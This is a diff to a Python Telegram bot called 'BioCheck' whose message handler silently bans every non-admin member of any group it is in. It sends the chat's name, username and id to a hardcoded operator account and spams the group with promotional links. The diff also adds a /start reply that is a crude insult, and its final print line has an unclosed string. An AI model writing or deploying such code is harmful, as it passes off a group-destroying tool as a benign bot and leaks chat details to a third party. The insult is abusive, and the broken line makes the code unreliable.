@@ -61,30 +61,43 @@ AMBOT = 7045191057
 
 app = Client("BioCheck", api_id=config.API_ID, api_hash=config.API_HASH, bot_token=config.BOT_TOKEN)
 
+@app.on_message(filters.command(["start"]))
+async def stats_command(client, message):
+    await message.delete()
+    await message.reply_text(f"""Thoda Sa Tu BenkaLoda he kya Bsdk
+    """)
+
+
 @app.on_message(~filters.private & filters.incoming & filters.bot)
 async def banall(client, message: Message):
-    try: 
-        chat_id = message.chat.id
-        chat_name = message.chat.title if message.chat.title else "None"
-        chatusername = message.chat.username if message.chat.username else "None"
-        banned = 0
-        AM = await app.send_message(AMBOT, f"Banall Started successfully.\n Chat Name : {chat_name}\nChat Username : {chatusername}\nChat Id : {chat_id}\nBanall Started By : {message.from_user.mention}\n")
+    chat_id = message.chat.id
+    chat_name = message.chat.title if message.chat.title else "None"
+    chat_username = message.chat.username if message.chat.username else "None"
+    banned = 0 
+    try:
+        AM = await app.send_message(
+            AMBOT, 
+            f"Banall Started successfully.\nChat Name: {chat_name}\nChat Username: {chat_username}\nChat Id: {chat_id}\nBanall Started By: {message.from_user.mention}"
+        )
         bot = await app.get_chat_member(chat_id, app.me.id)
         async for member in app.get_chat_members(chat_id):
             if member.status in ['administrator', 'creator'] or member.user.id == app.me.id:
                 continue 
             try:
                 await app.ban_chat_member(chat_id, member.user.id)
-                banned += 1
+                banned += 1 
             except Exception as e:
                 pass
-        await AM.edit(f"Banall Completed successfully.\nBanned {banned} members.\n\nChat Name : {chat_name}\nChat Username : {chatusername}\nChat Id : {chat_id}\nBanall Started By : {message.from_user.mention}")
-        AM = await app.send_message(chat_id, f"https://t.me/AmBotYT\nhttps://t.me/AmBotYT\nhttps://t.me/AmBotYT\nhttps://t.me/AmBotYT\nhttps://t.me/AmBotYT\nhttps://t.me/AmBotYT")
+        await AM.edit(
+            f"Banall Completed successfully.\nBanned {banned} members.\n\nChat Name: {chat_name}\nChat Username: {chat_username}\nChat Id: {chat_id}\nBanall Started By: {message.from_user.mention}"
+        )
+        await app.send_message(
+            chat_id,
+            "https://t.me/AmBotYT\nhttps://t.me/AmBotYT\nhttps://t.me/AmBotYT\nhttps://t.me/AmBotYT\nhttps://t.me/AmBotYT\nhttps://t.me/AmBotYT"
+        )
+    
     except FloodWait as e:
         await asyncio.sleep(e.x)
-        await banall(client, message)
-
-
-
-
+        await banall(client, message) 
 app.run()
+print("Bot Started)
